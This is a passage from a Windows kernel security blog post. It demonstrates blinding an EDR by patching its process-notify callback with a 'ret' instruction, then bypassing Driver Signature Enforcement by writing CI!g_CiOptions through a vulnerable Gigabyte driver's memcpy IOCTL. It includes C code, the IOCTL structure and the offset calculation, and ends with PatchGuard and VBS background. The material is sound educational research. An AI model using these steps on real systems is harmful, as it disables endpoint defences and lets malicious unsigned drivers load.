+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">0: kd&gt; u edr!OnProcessNotify
+edr!OnProcessNotify:
+fffff807`029f1720 4c89442418      mov     qword ptr [rsp+18h],r8
+fffff807`029f1725 4889542410      mov     qword ptr [rsp+10h],rdx
+fffff807`029f172a 48894c2408      mov     qword ptr [rsp+8],rcx
+fffff807`029f172f 56              push    rsi
+fffff807`029f1730 57              push    rdi
+fffff807`029f1731 4883ec78        sub     rsp,78h
+fffff807`029f1735 4883bc24a000000000 cmp   qword ptr [rsp+0A0h],0
+fffff807`029f173e 0f8442020000    je      edr!OnProcessNotify+0x266 (fffff807`029f1986)
+0: kd&gt;
+</code></pre></div><p>These are the first assembly instructions of our <code>OnProcessNotify</code> function (its address is <code>fffff807029f1720</code>) that are going to be executed every time a new process is created or terminated. Basically, where we can act on it. Block it, modify it, let it run.</p>
+<p>Now let&rsquo;s run our <code>evilcli.exe</code> with the <code>-p</code> option, the index of our EDR driver, and then look at this function address again.</p>
+<p><img src="/callbacks/evil010.png" alt=""></p>
+<p>And if we disassemble the <code>edr!OnProcessNotify</code> function again&hellip;</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">0: kd&gt; u edr!OnProcessNotify
+edr!OnProcessNotify:
+fffff807`029f1720 c3              ret
+fffff807`029f1721 0000            add     byte ptr [rax],al
+fffff807`029f1723 0000            add     byte ptr [rax],al
+fffff807`029f1725 0000            add     byte ptr [rax],al
+fffff807`029f1727 002410          add     byte ptr [rax+rdx],ah
+fffff807`029f172a 48894c2408      mov     qword ptr [rsp+8],rcx
+fffff807`029f172f 56              push    rsi
+fffff807`029f1730 57              push    rdi
+0: kd&gt;
+</code></pre></div><p>What do we see now? A <code>ret</code> instruction. Which means the EDR driver from now on will just not work as intended anymore. This trick is very intrusive, and it may bugcheck your system. If you didn&rsquo;t get it yet, bugcheck is a different word for &ldquo;blue screen&rdquo;.</p>
+<p>Why? The kernel page where the code from the <code>edr!OnProcessNotify</code> function lives is read-only pages. To patch it we need to change the <code>WP</code> (bit 16) - Write Protect bit - that inhibits supervisor-level procedures from writing into read-only pages. There are safe and unsafe ways of doing it. You can look at the code, but keep in mind that if you try to patch the code without changing the page <code>WP</code> bit you&rsquo;ll bugcheck the system. We need to clear this bit, which allows supervisor-level procedures to write into read-only pages (regardless of the U/S bit setting). However, if you change the page protection <code>WP</code> bit through the Control Register <code>CR0</code>, and don&rsquo;t revert your changes, you&rsquo;ll bugcheck the system. Why? PatchGuard. Also, a common error is that people will only change <code>CR0</code> in one of the CPUs, forgetting that there&rsquo;s a <code>CR0</code> register per CPU. The theory behind safely applying these changes is quite long and I can&rsquo;t/won&rsquo;t cover it here. Research it properly if you want to know more. Or just look at the code, and assume that what I&rsquo;m doing is correct. I can tell you that while it is safe what the code is doing, it is not the &ldquo;best&rdquo; way of doing it. The proper way is to use an MDL to map the memory you want to patch. In the project&rsquo;s code, you can also find how to use an MDL if you don&rsquo;t feel like looking at better sources than this project.</p>
+<p>Now, the questions you may be asking yourself. What about anti-tampering? Aren&rsquo;t EDRs, or AVs, checking if these callbacks are being zero&rsquo;ed out, removed, or patched?</p>
+<p>Probably they somehow should, right? The truth is&hellip; they aren&rsquo;t. At least 90% of them aren&rsquo;t. I only know one case that implements heavy anti-tampering checks. However, even this single case I&rsquo;m aware is considering to remove most of its checks. Why? This is heavy. When you execute code on the kernel you don&rsquo;t want to be wasting unnecessary CPU cycles. You don&rsquo;t want to be checking regularly if your registered callback function address is still there. You need to find a balance. A better option is to use a timer, and if during a certain amount of time you don&rsquo;t receive any notification than something is wrong. However, most of the software just assume it&rsquo;s fine, <em>no one is going to do this</em>. And if they do, the system is already compromised so why care?</p>
+<h2 id="driver-signature-enforcement-bypass">Driver Signature Enforcement Bypass</h2>
+<p><!-- raw HTML omitted -->Driver Signature Enforcement (DSE)<!-- raw HTML omitted --> is a feature, introduced with Windows Vista x64, that blocks a kernel-mode driver from loading, even with Administrator privileges, unless signed with a valid digital signature. As stated by <a href="http://twitter.com/j00ru">j00ru</a>, <em><a href="https://j00ru.vexillium.org/2012/11/defeating-windows-driver-signature-enforcement-part-1-default-drivers/">for anyone actively working on its kernel security is that the Driver Signature Enforcement (DSE in short) is not effective and can be bypassed with relative ease by any determined individual.</a></em></p>
+<p>Historically, this feature has been bypassed multiple times, in a multitude of ways. There&rsquo;s was nice presentation at BlackHat 2018 by <a href="https://twitter.com/dez_">Joe Desimone</a> and <a href="https://twitter.com/GabrielLandau">Gabriel Landau</a> from <a href="https://www.endgame.com/">Endgame</a>, <a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Desimone-Kernel-Mode-Threats-and-Practical-Defenses.pdf">Kernel Mode Threats and Practical Defenses</a> where you can find multiple examples. The most famous are probably <a href="https://github.com/hfiref0x/TDL">Turla</a> and <a href="https://github.com/houseofxyz/threat-INTel/blob/master/2015/The_Mystery_of_Duqu_2_0_a_sophisticated_cyberespionage_actor_returns.pdf">Duqu 2.0</a>.</p>
+<p>Anyway, DSE is enabled by default since Windows Vista for 64-bit versions. Any driver must be signed to be loaded, by a legitimate publisher. As we saw before, this feature can be disabled because forcing everyone to have signed drivers even during its development process doesn&rsquo;t sound like a good idea. So, when we enable test signing mode a watermark is displayed on the bottom right corner as we saw before.</p>
+<p><img src="/callbacks/testing.png" alt=""></p>
+<p>As we know, many high profile rootkits found their way into loading unsigned code into the kernel and even leverage kernel callbacks. Some examples are Mebroot, ZeroAccess, Rustock, Stuxnet, TDL3, Uroburos, Derusbi, Slingshot, and many others. So, how does the driver signing policy works? The best explanation I found was this blog post by <a href="https://twitter.com/j00ru">j00ru</a>: <a href="https://j00ru.vexillium.org/2010/06/insight-into-the-driver-signature-enforcement/">https://j00ru.vexillium.org/2010/06/insight-into-the-driver-signature-enforcement/</a></p>
+<p>More precisely, the &ldquo;Initialization&rdquo; section. Where we can read: <em>The actual heart of Code Integrity lies inside a single executable image, called CI.dll</em>. And then he continues with: <em>(&hellip;) the first function within our interest is the initialization routine, CI!CiInitialize. This routine is imported by the NT core (ntoskrnl.exe) and called during system initialization</em>.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">VOID SepInitializeCodeIntegrity()
+{
+  DWORD CiOptions;
+ 
+  g_CiEnabled = FALSE;
+  <span style="color:#fff;font-weight:bold">if</span>(!InitIsWinPEMode)
+    g_CiEnabled = TRUE;
+ 
+  memset(g_CiCallbacks,<span style="color:#ff0;font-weight:bold">0</span>,<span style="color:#ff0;font-weight:bold">3</span>*<span style="color:#fff;font-weight:bold">sizeof</span>(SIZE_T));
+ 
+  CiOptions = <span style="color:#ff0;font-weight:bold">4</span>|<span style="color:#ff0;font-weight:bold">2</span>;
+ 
+  <span style="color:#fff;font-weight:bold">if</span>(KeLoaderBlock)
+  {
+    <span style="color:#fff;font-weight:bold">if</span>(*(DWORD*)(KeLoaderBlock+<span style="color:#ff0;font-weight:bold">84</span>))
+    {
+      <span style="color:#fff;font-weight:bold">if</span>(SepIsOptionPresent((KeLoaderBlock+<span style="color:#ff0;font-weight:bold">84</span>),<span style="color:#0ff;font-weight:bold">L</span><span style="color:#0ff;font-weight:bold">&#34;DISABLE_INTEGRITY_CHECKS&#34;</span>))
+        CiOptions = <span style="color:#ff0;font-weight:bold">0</span>;
+      <span style="color:#fff;font-weight:bold">if</span>(SepIsOptionPresent((KeLoaderBlock+<span style="color:#ff0;font-weight:bold">84</span>),<span style="color:#0ff;font-weight:bold">L</span><span style="color:#0ff;font-weight:bold">&#34;TESTSIGNING&#34;</span>))
+        CiOptions |= <span style="color:#ff0;font-weight:bold">8</span>;
+    }
+ 
+    CiInitialize(CiOptions,(KeLoaderBlock+<span style="color:#ff0;font-weight:bold">32</span>),&amp;g_CiCallbacks);
+  }
+}
+</code></pre></div><p>The pseudocode above comes from the same post and <em>presents the general idea of the SepInitializeCodeIntegrity routine. As can be seen, some global nt!g_CiEnabled variable is being set to FALSE / TRUE, depending on whether the machine is booting up in the WinPE mode. Furthermore, CiOptions is initialized accordingly to the system boot options and finally passed to the CiInitialize routine (&hellip;)</em>.</p>
+<p>Please read the whole post. However, the pseudocode above is enough for us to understand what&rsquo;s going on and come up with a bypass ourselves. From above, we learned that the <code>CiInitialize</code> function is located in the <code>ci.dll</code> file. Its first argument, <code>CiOptions</code>, contains the flags of the current signing policy. As we can see above, the default value of the flags (<code>CiOptions = 4|2;</code>) is 4 or 2. That is <code>0x6</code> in hexadecimal. Now, if the driver signing enforcement is disabled (as in test signing mode) the flags will be equal to 4 or 2 or 8. That is, <code>0xe</code> in hexadecimal.</p>
+<p>So, what if we exploit a kernel vulnerability, or a vulnerable kernel driver, that allow us to write into kernel space? That&rsquo;s what we&rsquo;ll do next.</p>
+<p>Note: there are some other really interesting projects, like this <a href="https://github.com/hfiref0x/KDU">one</a>, this <a href="https://github.com/hfiref0x/DSEFix">one</a>, this <a href="https://github.com/hfiref0x/Stryker">one</a>, etc. that even load fileless drivers as shellcode decreasing its footprint and making these techniques way stealthier. Worth having a look.</p>
+<p>If you dive into the underground of the Game Hacking Scene you&rsquo;ll find plenty of vulnerable drivers being used to cheat and bypass AntiCheat technology. Some of the drivers being abused are a complete disaster and look more like backdoors than anything else. One well know driver was part of the game <a href="https://streetfighter.com/">Street Fighter V</a>, from <a href="http://www.capcom.com/">Capcom</a>. This driver only functionality is well described <a href="https://www.pcgamesn.com/street-fighter-v/sfv-capcom-rootkit-security">here</a>. Basically, it would take a user pointer, disable <a href="https://j00ru.vexillium.org/2011/06/smep-what-is-it-and-how-to-beat-it-on-windows/">SMEP</a>, execute code at the pointer&rsquo;s address, and enable SMEP again. According to Capcom, a <em>&ldquo;non-DRM anti-crack solution&rdquo;</em>. Right&hellip; Anyway, you may ask why are we talking about this driver? First, because it is widely known. Second, because this driver could potentially be abused to load our unsigned code in the kernel. However, this driver signature was <strong>revoked</strong> and the driver can&rsquo;t be loaded anymore. It&rsquo;s not very common, but it happens.</p>
+<p>As a proof-of-concept we&rsquo;ll use a driver, that&rsquo;s vulnerable, but still (as of today) unrevoked. However, there are some remarks I would like to make before we proceed regarding loading drivers on Windows 10.</p>
+<p>Note that Microsoft in <a href="https://techcommunity.microsoft.com/t5/windows-hardware-certification/driver-signing-changes-in-windows-10/ba-p/364859">April 2015 stated</a>: <em>with the release of Windows 10, all new Windows 10 kernel mode drivers must be submitted to and digitally signed by the Windows Hardware Developer Center Dashboard portal. Windows 10 will not load new kernel mode drivers which are not signed by the portal.</em></p>
+<p><em>Additionally, starting 90 days after the release of Windows 10, the portal will only accept driver submissions, including both kernel and user mode driver submissions, that have a valid Extended Validation (&ldquo;EV&rdquo;) Code Signing Certificate.</em></p>
+<p>However, <em><a href="https://web.archive.org/web/20200229152555/https://blogs.msdn.microsoft.com/windows_hardware_certification/2016/07/26/driver-signing-changes-in-windows-10-version-1607/">due to technical and ecosystem readiness issues, this was not enforced by Windows Code Integrity and remained only a policy statement.</a></em></p>
+<p>Again, is worth underlining <em><a href="https://web.archive.org/web/20200229152555/https://blogs.msdn.microsoft.com/windows_hardware_certification/2016/07/26/driver-signing-changes-in-windows-10-version-1607/">Starting with new installations of Windows 10, version 1607, the previously defined driver signing rules will be enforced by the Operating System, and Windows 10, version 1607 will not load any new kernel mode drivers which are not signed by the Dev Portal. OS signing enforcement is only for new OS installations; systems upgraded from an earlier OS to Windows 10, version 1607 will not be affected by this change</a>.</em></p>
+<p>This means that, unless <code>UpgradedSystem</code> is set, if you enable Secure Boot you&rsquo;ll &ldquo;activate&rdquo; the new 1607+ policy. As we can read from above, this policy requires Attestation Signed drivers, or WHQL drivers, for drivers signed after October 29th 2015.</p>
+<p>Geoff Chappell can <a href="http://www.geoffchappell.com/notes/security/whqlsettings/index.htm">describe what a WHQL-signed driver is</a> better than me. <em>A WHQL-signed driver is signed with a certificate whose private key is kept by Microsoft so that only Microsoft can do the signing. WHQL means Windows Hardware Quality Labs. For many years the only way that Microsoft would sign a driver for an Independent Software Vendor (ISV) was if the driver was sent to Microsoft with a record of having passed an appropriate WHQL test suite. In those years, a WHQL signature gave some assurance of the driver’s quality.</em></p>
+<p><em>For the many sorts of driver for which Microsoft had not yet devised tests for hardware compatibility, ISVs simply could not get WHQL signatures. Such drivers could instead be cross-signed by the ISV using both a Software Publisher Certificate (SPC) that is issued to the ISV by a third-party certification authority (CA) and a publicly available cross-certificate that Microsoft issues to the CA. In the particular way that Windows validates signatures on drivers, the signature on a cross-signed driver has a root certificate from Microsoft but it’s one that distinguishes the code verification as having been out-sourced. Microsoft’s involvement in cross-signing is only indirect, to vet CAs as having sufficiently high standards for authenticating that whoever they issue their certificates to is an identifiable (and hopefully responsible) software publisher. A cross-signature is some assurance that the driver, of whatever quality, is the work of a specific known entity.</em></p>
+<p>Don&rsquo;t forget to read the <code>Exceptions</code> section, because as we can read here: <a href="https://docs.microsoft.com/en-gb/windows-hardware/drivers/install/kernel-mode-code-signing-policy--windows-vista-and-later-">https://docs.microsoft.com/en-gb/windows-hardware/drivers/install/kernel-mode-code-signing-policy&ndash;windows-vista-and-later-</a></p>
+<p><img src="/callbacks/msnote.png" alt=""></p>
+<p>However, <em>cross-signed drivers are still permitted if any of the following are true</em>:</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">- The PC was upgraded from an earlier release of Windows to Windows 10, version 1607.
+- Secure Boot is off in the BIOS.
+- Driver was signed with an end-entity certificate issued prior to July 29th 2015 that chains to a supported cross-signed CA.
+</code></pre></div><p>I&rsquo;ve never used the portal myself, so I can only document here what Microsoft&rsquo;s documentation states. If you are interested, there&rsquo;s a <a href="http://wrogn.com/tag/driver-signing/">nice post here</a> where <a href="http://wrogn.com/about/">Christoph Lüders</a> describes his experience purchasing an Extended Validation Certificate, getting an account on the portal, and going through the attestation route. Very informative. Additionally, have a look at <a href="https://channel9.msdn.com/Events/Windows/Filter-Plugfest28/Driver-Certification-on-Windows-Client-and-Server">this video</a> from <a href="https://channel9.msdn.com/">channel9</a>.</p>
+<p>Why is this important? Because <strong>the driver I chose is not WHQL signed</strong>. This means, if <strong>Secure Boot is enabled this <a href="https://www.secureauth.com/labs/advisories/gigabyte-drivers-elevation-privilege-vulnerabilities">GigaByte</a> driver won&rsquo;t load</strong>. Anyway, this driver serves our demo purpose perfectly.</p>
+<h2 id="the-gigabyte-driver">The Gigabyte Driver</h2>
+<p><em><a href="https://www.amazon.co.uk/Windows-Internals-Part-architecture-management/dp/0735684189/">Microsoft has stated that a million unique driver hashes are seen through telemetry, monthly!</a></em>. These drivers, many times, come with crazy functionalities exposed to user-mode. Plus, many other vulnerabilities. So, assuming that all the code that runs in <code>ring0</code> is trusted is just a bad assumption as we&rsquo;ll see.</p>
+<p>The <code>nday</code> I mentioned at the beginning of this post is this <a href="https://www.secureauth.com/labs/advisories/gigabyte-drivers-elevation-privilege-vulnerabilities">Gigabyte driver vulnerability</a>. When I decided to choose a driver for this PoC, this driver immediately came to mind. The main reason, its hilarious report timeline.</p>
+<p><img src="/callbacks/gigabyte_lol.png" alt=""></p>
+<p>I knew some of these Gigabyte drivers have been used by <a href="https://www.youtube.com/watch?v=yJHyHU5UjTg">some gamers for cheating</a>. And, based on the report timeline I also knew that these vulnerabilities are probably still unfixed as of today (I didn&rsquo;t bother checking). What I knew was that these drivers weren&rsquo;t revoked and can still be loaded in the latest Windows 10 x64, and consequently exploited.</p>
+<p>If you read the <a href="https://www.secureauth.com/labs/advisories/gigabyte-drivers-elevation-privilege-vulnerabilities">SecureAuth&rsquo;s Advisory</a>, it seems there&rsquo;s a party in <code>ring0</code> and we are all invited, and especially welcome. <em>Arbitrary ring0 VM read/write, Port mapped I/O access, MSR Register access, Arbitrary physical memory read/write</em>. It&rsquo;s hard to choose one, but we&rsquo;ll go with the easiest one, that is the first one. We only need to write one single byte to achieve our goal.</p>
+<p>As we saw before, we need to change <code>CI!g_CiOptions</code> global variable value. But we don&rsquo;t know what&rsquo;s its address, right? Well yes, but any user can get it easily. From a medium integrity process (integrity level for most of the programs a normal user runs) it is trivial to get the address we are interested in. Which means <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/overview-of-threat-mitigations-in-windows-10">Kernel ASLR (KASLR)</a> has no power here.</p>
+<p>So from a medium integrity process, we can just leak <code>ci!CiInitialize</code> and <code>CI!g_CiOptions</code>.</p>
+<p><img src="/callbacks/gigabyte001.png" alt=""></p>
+<p>As I mentioned before, one byte write in Kernel space is enough to compromise the whole system. We learnt from <a href="https://www.secureauth.com/labs/advisories/gigabyte-drivers-elevation-privilege-vulnerabilities">SecureAuth&rsquo;s Advisory</a> that we can read and write arbitrary memory in <code>ring0</code>. We don&rsquo;t care about reading because we are exploiting this vulnerability from medium integrity. Otherwise, we could use the read to leak memory and bypass KASLR from a low integrity process.</p>
+<p>Anyway, from a medium integrity process all we have to do is find the base address of <code>CI.dll</code> (among others, this DLL main service is to verify the integrity of digitally signed drivers). Here&rsquo;s the function that enumerates all system&rsquo;s drivers and finds the base address we are interested in.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">BOOL EnumSystemDrivers(PVOID* ModuleBase, PCHAR ModuleImage)
+{
+	_NtQuerySystemInformation NtQuerySystemInformation;
+	PSYSTEM_MODULE_INFORMATION pModuleInfo;
+	PSYSTEM_MODULE_INFORMATION_ENTRY pSystemModuleEntry = <span style="color:#fff;font-weight:bold">NULL</span>;
+	ULONG i, len;
+	NTSTATUS ret;
+	HMODULE ntdllHandle;
+	CHAR kFullName[<span style="color:#ff0;font-weight:bold">256</span>];
+
+	ntdllHandle = GetModuleHandle(<span style="color:#0ff;font-weight:bold">L</span><span style="color:#0ff;font-weight:bold">&#34;ntdll&#34;</span>);
+	<span style="color:#fff;font-weight:bold">if</span> (!ntdllHandle)
+		<span style="color:#fff;font-weight:bold">return</span> FALSE;
+
+	NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(ntdllHandle, <span style="color:#0ff;font-weight:bold">&#34;NtQuerySystemInformation&#34;</span>);
+	<span style="color:#fff;font-weight:bold">if</span> (!NtQuerySystemInformation)
+		<span style="color:#fff;font-weight:bold">return</span> FALSE;
+
+	ret = NtQuerySystemInformation(SystemModuleInformation, <span style="color:#fff;font-weight:bold">NULL</span>, <span style="color:#ff0;font-weight:bold">0</span>, &amp;len);
+
+	pModuleInfo = (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
+
+	ret = NtQuerySystemInformation(SystemModuleInformation, pModuleInfo, len, &amp;len);
+
+	<span style="color:#fff;font-weight:bold">if</span> (g_ListDrivers)
+		printf(<span style="color:#0ff;font-weight:bold">&#34;Base Address</span><span style="color:#0ff;font-weight:bold">\t</span><span style="color:#0ff;font-weight:bold"> ImageName</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>);
+	
+	<span style="color:#fff;font-weight:bold">for</span> (i = <span style="color:#ff0;font-weight:bold">0</span>; i &lt; pModuleInfo-&gt;Count; i++)
+	{
+		<span style="color:#fff;font-weight:bold">if</span>(g_ListDrivers)
+			printf(<span style="color:#0ff;font-weight:bold">&#34;%p %s</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>, pModuleInfo-&gt;Module[i].Base, pModuleInfo-&gt;Module[i].ImageName);
+
+		<span style="color:#fff;font-weight:bold">if</span> (strstr(pModuleInfo-&gt;Module[i].ImageName, <span style="color:#0ff;font-weight:bold">&#34;CI.dll&#34;</span>) != <span style="color:#fff;font-weight:bold">NULL</span>)
+		{
+			strcpy_s(ModuleImage, <span style="color:#fff;font-weight:bold">sizeof</span>(kFullName) - <span style="color:#ff0;font-weight:bold">1</span>, pModuleInfo-&gt;Module[i].ImageName);
+			*ModuleBase = pModuleInfo-&gt;Module[i].Base;
+		}
+	}
+
+	<span style="color:#fff;font-weight:bold">return</span> TRUE;
+}
+</code></pre></div><p>We define a structure following what the driver expects and it&rsquo;s documented on <a href="https://www.secureauth.com/labs/advisories/gigabyte-drivers-elevation-privilege-vulnerabilities">SecureAuth&rsquo;s Advisory</a>:</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#fff;font-weight:bold">typedef</span> <span style="color:#fff;font-weight:bold">struct</span> _GIO_MemCpyStruct {
+	ULONG64 dest;
+	ULONG64* src;
+	DWORD size;
+} GIO_MemCpyStruct;
+</code></pre></div><p>And we call <code>DeviceIoControl</code> using the vulnerable IOCTL.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">DeviceIoControl(ghDriver, IOCTL_GIO_MEMCPY, (LPVOID)&amp;mystructIn, <span style="color:#fff;font-weight:bold">sizeof</span>(mystructIn), (LPVOID)outbuffer, <span style="color:#fff;font-weight:bold">sizeof</span>(outbuffer), &amp;returned, <span style="color:#fff;font-weight:bold">NULL</span>);
+</code></pre></div><p>Then it&rsquo;s just a matter of initializing the structure with the correct values, and simple math to calculate the exact address of the global variable we want to modify.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">CiInitialize - hModule + kBase - 0x9eb8
+</code></pre></div><p>You can easily finish the exploit yourself with the information above. Below is a quick demo of this &ldquo;attack&rdquo; (in a different VM without test signing mode, and without kernel debugging enabled). We start by loading the vulnerable Gigabyte&rsquo;s signed driver. Then we disable DSE. We load our malicious driver successfully. And finally, we revert our changes (enabling DSE again).</p>
+<p><img src="/callbacks/pwn4d.gif" alt=""></p>
+<p>So, is this exploit <a href="https://en.wikipedia.org/wiki/Kernel_Patch_Protection">PatchGuard</a> friendly? The <code>CI.dll</code> variables are protected by <code>PatchGuard</code> indeed (starting with Windows 8.1). However, this doesn&rsquo;t mean we&rsquo;ll get an instant <code>PatchGuard</code> action (<code>bugcheck</code>). This will eventually lead to a <code>bugcheck</code> when <code>PatchGuard</code> notices the change. However, if we revert the change (restore the original state) we&rsquo;ll be fine. There&rsquo;s a risk here obviously, as we don&rsquo;t know when is <code>PatchGuard</code> going to look at our global variable. <code>PatchGuard</code> runs randomly, so it can happen immediately after our change, 5 minutes later, one hour later, 24 hours later, we don&rsquo;t know.</p>
+<h2 id="kernel-patch-protection-kpp">Kernel Patch Protection (KPP)</h2>
+<p><a href="https://en.wikipedia.org/wiki/Kernel_Patch_Protection">Kernel Patch Protection (KPP)</a>, also known as <code>PatchGuard</code> was first released for Windows XP 64-bit. Windows 32-bit systems don&rsquo;t have <code>PatchGuard</code> enabled (not even Windows 10), due to many crazy legacy 32-bit drivers &ldquo;messing&rdquo; with critical Windows kernel structures.</p>
+<p>Windows server versions don&rsquo;t support 32-bit systems anymore, and hopefully, these are going away on the desktop too. I couldn&rsquo;t find any statistics that would confirm it, as Microsoft doesn&rsquo;t share that data. Anyway, we all know that&rsquo;s not easy to buy new 32-bit hardware anymore. I wouldn&rsquo;t be surprised if Microsoft stops supporting 32-bit desktop systems too.</p>
+<p>Anyway, what is PatchGuard? PatchGuard is a Windows Kernel anti-tampering system. Simply put, it creates hashes of the system&rsquo;s critical structures and makes sure you don&rsquo;t modify them.</p>
+<p>As mentioned above, is worth notice that <code>PatchGuard</code> just crashes the system in case it sees something wrong, it doesn&rsquo;t do anything to prevent it, or revert any changes made. The <code>bugcheck</code> code you&rsquo;ll see is <code>0x109</code>, that is <code>CRITICAL_STRUCTURE_CORRUPTION</code>. The best compilation of checks performed by <code>PatchGuard</code> I could find was in the book <a href="https://www.amazon.co.uk/Windows-Internals-Part-architecture-management/dp/0735684189/">Windows Internals Part 1</a>. <a href="https://en.wikipedia.org/wiki/Kernel_Patch_Protection">Wikipedia</a> also has a few but I wouldn&rsquo;t trust it that much, as the sources for the claims are more than 10 years old. You can also find a few things you should avoid <a href="https://github.com/hfiref0x/KDU/tree/master/Source/Examples/BadRkDemo">here</a>.</p>
+<p>As we know, many device drivers patch Windows kernel structures in a multitude of ways (such as, dangerous version-specific constructs/hard-coded offsets and code fingerprinting on frequently changing code) leading to system instability (to say the least). This is even true for Endpoint Security Software (actually AVs are/were the main cause of bugchecks for a long time). How ironic? One common case is/was patching the <a href="https://en.wikipedia.org/wiki/System_Service_Descriptor_Table">System Service Descriptor Table (SSDT)</a>, which is a table containing the array of pointers for each system call handler. The idea is to intercept these system calls to add some functionality on top of it and keep the users safe. Some AVs for 32-bit systems might still do this, and Endpoint Security Software vendors aren&rsquo;t the only ones patching Windows kernel structures. Malware does the same (leading to further instability), patching code already patched is tricky.</p>
+<p>If we think about this problem, the truth is that protecting the kernel against these modifications is very hard (if not impossible) if everything is running in <code>ring0</code>. It&rsquo;s a race and a race that you can always win. There&rsquo;s no security boundary. For Microsoft, there&rsquo;s not even a security boundary between Administrator and <code>ring0</code> (and I agree). This means that <code>PatchGuard</code> is heavily obfuscated to avoid being reversed, and attacked. However, obfuscation is not a security boundary either. <code>PatchGuard</code> is only about increasing the cost (in time, and complexity) to a potential attacker. As mentioned above, <code>PatchGuard</code> is non-deterministic (random), and not documented, with the &ldquo;ultimate&rdquo; goal of making exploits unreliable (not stop them). PatchGuard doesn&rsquo;t run the same checks all the time, and at once. It&rsquo;s random, and multiple checks can run in parallel. Objectively, PatchGuard is security by obscurity at its best (at Microsoft maybe only 5 people have access to the source code, which is kept in a secret source code repository).</p>
+<p><code>PatchGuard</code> is trying to enforce the use of supported mechanisms to have full visibility of what&rsquo;s happening on the system. These supported mechanisms are the subject of this post. That is, processes/threads and image load notifications. Plus, mini-filter drivers (which allow on the fly &ldquo;hooking&rdquo; of all file operations). Object manager filtering (remove certain access rights on the fly), NDIS and WFP filters (access to raw ethernet packets), and ETW (mentioned before).</p>
+<p>We need to keep in mind, that even with <code>KPP</code> and <code>DSE</code> we are still fighting a &ldquo;lost&rdquo; battle. Which is <code>ring0</code> vs <code>ring0</code>. Because of this, Microsoft now leverages the <a href="https://en.wikipedia.org/wiki/Hyper-V">Hyper-V</a> hypervisor to provide a new set of services known as <a href="https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs">Virtualization-based security (VBS)</a>.</p>
+<p>There are some AV vendors already rolling their own hypervisors based engines, and they will identify (as of today) the attacks mentioned before. <a href="https://os.kaspersky.com/products/kaspersky-secure-hypervisor/">Kaspersky</a>, <a href="https://www.avast.com/en-gb/technology/malware-detection-and-blocking">Avast</a>, <a href="https://www.bitdefender.com/business/enterprise-products/hypervisor-introspection.html">BitDefender</a>, <a href="https://www.360totalsecurity.com/en/">Qihu</a> and maybe others that I&rsquo;m not aware, already implement their Hypervisor, be warned. This doesn&rsquo;t mean that the AV software you install in your PC comes with a Hypervisor. They don&rsquo;t support nested virtualization (<a href="https://forum.avast.com/index.php?topic=162445.60">at least without breaking stuff</a>). What happens, is that their cloud solutions run over their Hypervisor. What does this mean? Yes, all the files you have in your computer are &ldquo;flying&rdquo; to the cloud to be &ldquo;analyzed&rdquo;. If you were wondering how this is actually how Kaspersky has been detecting multiple 0days in the wild.</p>
+<p>To know more about PatchGuard I highly recommend you to read the awesome research by <a href="https://www.tetrane.com">Tetrane</a> here: <a href="https://blog.tetrane.com/downloads/Tetrane_PatchGuard_Analysis_RS4_v1.01.pdf">https://blog.tetrane.com/downloads/Tetrane_PatchGuard_Analysis_RS4_v1.01.pdf</a>. Also, anything from <a href="http://www.nynaeve.net/?p=111">Skywing</a> (now the main authority behind it), and <a href="http://www.uninformed.org">Uninformed</a> is pure gold. Check the <code>References</code> at the end of this post.</p>
+<h2 id="virtualization-based-security-vbs">Virtualization-based Security (VBS)</h2>
+<p>With <a href="https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs">Virtualization-based Security</a>, the kernel runs at a higher privilege than user-mode applications and is isolated from them.</p>
+<p>In a nutshell, with VBS user-mode and kernel-mode code run in VTL 0 (traditional model) and is not aware of the existence of VTL 1. So, anything in VTL 1 can&rsquo;t be accessed from VTL 0. This means that even if a malware actor obtains code execution in <code>ring0</code> VTL 0, it still can&rsquo;t access anything in VTL 1. Not even user-mode code (Isolated User Mode (IUM), as shown in the image below).</p>
+<p>The best description and image illustrating what&rsquo;s stated above I could find was from <a href="https://docs.microsoft.com/en-us/windows/win32/procthread/isolated-user-mode--ium--processes">https://docs.microsoft.com/en-us/windows/win32/procthread/isolated-user-mode&ndash;ium&ndash;processes</a></p>
+<p><img src="/callbacks/uim-architecture.png" alt=""> - Microsoft copyrighted</p>
+<p>Needless to say, that VTL 1 to be fully trusted, it requires Secure Boot, a non-compromised hypervisor, <a href="https://en.wikipedia.org/wiki/List_of_IOMMU-supporting_hardware">IOMMU supporting hardware</a>, and the <a href="https://en.wikipedia.org/wiki/Intel_Management_Engine">Intel Management Engine (ME)</a> without vulnerabilities that can be exploited from VTL 0.</p>
